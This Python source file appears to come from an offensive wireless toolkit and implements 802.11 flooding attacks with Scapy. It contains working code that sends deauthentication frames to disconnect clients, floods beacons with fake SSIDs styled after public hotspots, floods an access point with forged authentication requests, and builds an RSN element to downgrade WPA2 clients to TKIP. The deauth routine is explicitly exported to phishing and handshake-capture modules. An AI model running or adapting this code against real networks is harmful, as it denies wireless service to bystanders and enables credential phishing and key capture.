#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek -- https://github.com/Uniao-Geek
"""Native flood/DoS engine for 802.11 wireless attacks.

Implements all mdk4 attack modes natively in Python/Scapy, replacing
external mdk3/mdk4 bridges. All modes use raw 802.11 frame injection.

Supported modes (mirrors mdk4 mode flags):
  b   Beacon flood - random SSIDs or custom list
  a   Authentication flood
  d   Deauthentication/disassociation flood
  p   Probe request flood
  m   Michael MIC shutdown (TKIP MIC error forcing)
  g   WPA downgrade via RSN IE manipulation
  e   EAPOL Start/Logoff flood
  w   WIDS confusion (rapid MAC/SSID alternation)

The send_deauth() function is exported standalone for use by
phishing_engine.py and handshake_snooper.py.

OS requirement: Linux only (raw sockets, monitor mode, nl80211).

Version: 1.0.0
"""


import logging
import os
import random
import string
import struct
import subprocess
import time
from typing import List, Optional, Tuple

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os
from wirelessxpl.modules.generic.wifi._disclaimer import (
    require_authorised_lab,
    warn_pmf_ios,
)

logger = logging.getLogger(__name__)

# --------------------------------------------------------------------------- #
#  Michael MIC (TKIP) implementation                                          #
# --------------------------------------------------------------------------- #

def _michael_b(l: int, r: int) -> tuple[int, int]:
    """Michael block function - single round.

    Args:
        l: Left 32-bit word.
        r: Right 32-bit word.

    Returns:
        Updated (l, r) tuple after one Michael mixing round.
    """
    r ^= ((l << 17) | (l >> 15)) & 0xFFFFFFFF
    r &= 0xFFFFFFFF
    l = (l + r) & 0xFFFFFFFF
    r ^= ((l & 0xFF00FF00) >> 8) | ((l & 0x00FF00FF) << 8)
    r &= 0xFFFFFFFF
    l = (l + r) & 0xFFFFFFFF
    r ^= ((l << 3) | (l >> 29)) & 0xFFFFFFFF
    r &= 0xFFFFFFFF
    l = (l + r) & 0xFFFFFFFF
    r ^= ((l >> 2) | (l << 30)) & 0xFFFFFFFF
    r &= 0xFFFFFFFF
    l = (l + r) & 0xFFFFFFFF
    return l, r


def michael_mic(key: bytes, data: bytes) -> bytes:
    """Compute Michael MIC for TKIP.

    Args:
        key: 8-byte Michael key.
        data: Data to authenticate.

    Returns:
        8-byte Michael MIC value.

    Raises:
        ValueError: If key length is not exactly 8 bytes.
    """
    if len(key) != 8:
        raise ValueError(f"Michael key must be exactly 8 bytes, got {len(key)}")

    l = struct.unpack("<I", key[:4])[0]
    r = struct.unpack("<I", key[4:8])[0]

    # Append 0x5a then pad to the next multiple of 4 with trailing zeros.
    padded = data + b"\x5a"
    remainder = len(padded) % 4
    if remainder:
        padded += b"\x00" * (4 - remainder)
    # One extra zero block to finalise.
    padded += b"\x00\x00\x00\x00"

    for i in range(0, len(padded), 4):
        block = struct.unpack("<I", padded[i : i + 4])[0]
        l ^= block
        l, r = _michael_b(l, r)

    return struct.pack("<II", l, r)


# --------------------------------------------------------------------------- #
#  Low-level helpers                                                          #
# --------------------------------------------------------------------------- #

def _random_mac() -> str:
    """Generate a random locally-administered unicast MAC address.

    Returns:
        Colon-separated MAC string in lowercase hex.
    """
    octets = [random.randint(0, 255) for _ in range(6)]
    octets[0] = (octets[0] & 0xFE) | 0x02  # unicast, locally administered
    return ":".join(f"{b:02x}" for b in octets)


def _random_ssid(min_len: int = 4, max_len: int = 16) -> str:
    """Generate a plausible-looking random SSID.

    Args:
        min_len: Minimum SSID character length when using random suffix.
        max_len: Maximum SSID character length when using random suffix.

    Returns:
        Random SSID string.
    """
    prefixes = [
        "FreeWiFi_", "Starbucks_", "Airport_", "Hotel_",
        "Guest_", "NETGEAR", "linksys", "ATT", "xfinity",
        "HP-Print-", "DIRECT-", "Samsung_", "AndroidAP",
    ]
    charset = string.ascii_letters + string.digits
    if random.random() < 0.5:
        suffix = "".join(random.choices(charset, k=random.randint(2, 6)))
        return random.choice(prefixes) + suffix
    length = random.randint(min_len, max_len)
    return "".join(random.choices(charset, k=length))


def _set_channel(interface: str, channel: int) -> None:
    """Switch interface to the given 2.4/5 GHz channel using iw.

    Args:
        interface: Monitor-mode interface name.
        channel: Target channel number (1-14 for 2.4 GHz, etc.).
    """
    try:
        subprocess.run(
            ["iw", "dev", interface, "set", "channel", str(channel)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=3,
        )
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        pass


def _build_rsn_ie_tkip_only() -> bytes:
    """Build an RSN IE body advertising TKIP-only (no CCMP).

    Removes CCMP from both group and pairwise cipher suites, advertising
    only TKIP. When injected in a beacon, forces WPA2 clients that honour
    beacon RSN IE to negotiate WPA/TKIP instead of WPA2/CCMP.

    Returns:
        Raw RSN IE body bytes (tag and length octets NOT included).
    """
    body = struct.pack("<H", 1)                  # RSN version 1
    body += b"\x00\x0f\xac\x02"                 # group cipher: TKIP
    body += struct.pack("<H", 1)                 # pairwise count: 1
    body += b"\x00\x0f\xac\x02"                 # pairwise cipher: TKIP
    body += struct.pack("<H", 1)                 # AKM count: 1
    body += b"\x00\x0f\xac\x02"                 # AKM suite: PSK
    body += struct.pack("<H", 0)                 # RSN capabilities: 0
    return body


# --------------------------------------------------------------------------- #
#  Standalone deauth -- imported by phishing_engine and handshake_snooper     #
# --------------------------------------------------------------------------- #

def send_deauth(
    interface: str,
    bssid: str,
    client: str = "FF:FF:FF:FF:FF:FF",
    count: int = 10,
    reason: int = 7,
) -> None:
    """Send 802.11 deauthentication frames via raw injection.

    Injects ``count`` Dot11Deauth frames in both directions (AP->client and
    client->AP). When client is the broadcast address all associated stations
    are affected simultaneously.

    Args:
        interface: Monitor-mode wireless interface name.
        bssid: BSSID of the target AP (used as source in AP->client frames).
        client: Client MAC address or broadcast (FF:FF:FF:FF:FF:FF).
        count: Number of deauth cycles to perform.
        reason: IEEE 802.11 deauthentication reason code (7 = class-3 frame
            received from non-associated STA, 1 = unspecified).

    Raises:
        ImportError: If Scapy is not available in the current environment.
    """
    from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp

    bssid_l = bssid.lower()
    client_l = client.lower()

    ap_to_sta = (
        RadioTap() /
        Dot11(type=0, subtype=12,
              addr1=client_l, addr2=bssid_l, addr3=bssid_l) /
        Dot11Deauth(reason=reason)
    )
    sta_to_ap = (
        RadioTap() /
        Dot11(type=0, subtype=12,
              addr1=bssid_l, addr2=client_l, addr3=bssid_l) /
        Dot11Deauth(reason=reason)
    )

    for _ in range(count):
        sendp(ap_to_sta, iface=interface, verbose=False)
        sendp(sta_to_ap, iface=interface, verbose=False)


# --------------------------------------------------------------------------- #
#  Mode b -- Beacon flood                                                     #
# --------------------------------------------------------------------------- #

def _run_beacon_flood(
    interface: str,
    ssids: list[str],
    channel: int | None,
    count: int,
    delay: float,
    verbose: bool,
) -> int:
    """Inject Dot11Beacon frames with random or user-supplied SSIDs.

    Args:
        interface: Monitor-mode interface.
        ssids: Pre-built SSID list; empty list means generate randomly each frame.
        channel: Fixed channel; None enables sequential hopping across 1-13.
        count: Maximum frames to inject (0 = infinite until KeyboardInterrupt).
        delay: Inter-frame delay in seconds.
        verbose: Emit progress logs every 100 frames when True.

    Returns:
        Total number of frames injected.
    """
    from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp

    sent = 0
    limit = count if count > 0 else 10 ** 9
    hop_channels = list(range(1, 14))
    hop_idx = 0
    ch = channel if channel is not None else 6

    try:
        for i in range(limit):
            ssid = ssids[i % len(ssids)] if ssids else _random_ssid()
            bssid = _random_mac()
            enc_ssid = ssid.encode("utf-8", errors="replace")

            if channel is None and i % 50 == 0:
                ch = hop_channels[hop_idx % len(hop_channels)]
                hop_idx += 1
                _set_channel(interface, ch)

            pkt = (
                RadioTap() /
                Dot11(type=0, subtype=8,
                      addr1="ff:ff:ff:ff:ff:ff",
                      addr2=bssid, addr3=bssid) /
                Dot11Beacon(cap="ESS+privacy") /
                Dot11Elt(ID="SSID", info=enc_ssid, len=len(enc_ssid)) /
                Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") /
                Dot11Elt(ID="DSset", info=bytes([ch]))
            )
            sendp(pkt, iface=interface, verbose=False)
            sent += 1

            if verbose and sent % 100 == 0:
                print_status(f"Beacon flood: {sent} frames sent")
            if delay:
                time.sleep(delay)
    except KeyboardInterrupt:
        pass

    return sent


# --------------------------------------------------------------------------- #
#  Mode a -- Authentication flood                                             #
# --------------------------------------------------------------------------- #

def _run_auth_flood(
    interface: str,
    bssid: str,
    count: int,
    delay: float,
    verbose: bool,
) -> int:
    """Saturate AP association table with forged open-system auth requests.

    Args:
        interface: Monitor-mode interface.
        bssid: Target AP BSSID.
        count: Maximum frames (0 = infinite).
        delay: Inter-frame delay in seconds.
        verbose: Emit progress logs every 100 frames when True.

    Returns:
        Total frames injected.
    """
    from scapy.all import Dot11, Dot11Auth, RadioTap, sendp

    bssid_l = bssid.lower()
    sent = 0
    limit = count if count > 0 else 10 ** 9

    try:
        for _ in range(limit):
            src = _random_mac()
            pkt = (
                RadioTap() /
                Dot11(type=0, subtype=11,
                      addr1=bssid_l, addr2=src, addr3=bssid_l) /
                Dot11Auth(algo=0, seqnum=1, status=0)
            )
            sendp(pkt, iface=interface, verbose=False)
            sent += 1

            if verbose and sent % 100 == 0:
                print_status(f"Auth flood: {sent} frames sent")
            if delay:
                time.sleep(delay)
    except KeyboardInterrupt:
        pass

    return sent


# --------------------------------------------------------------------------- #
#  Mode d -- Deauth/disassoc flood                                           #
# --------------------------------------------------------------------------- #

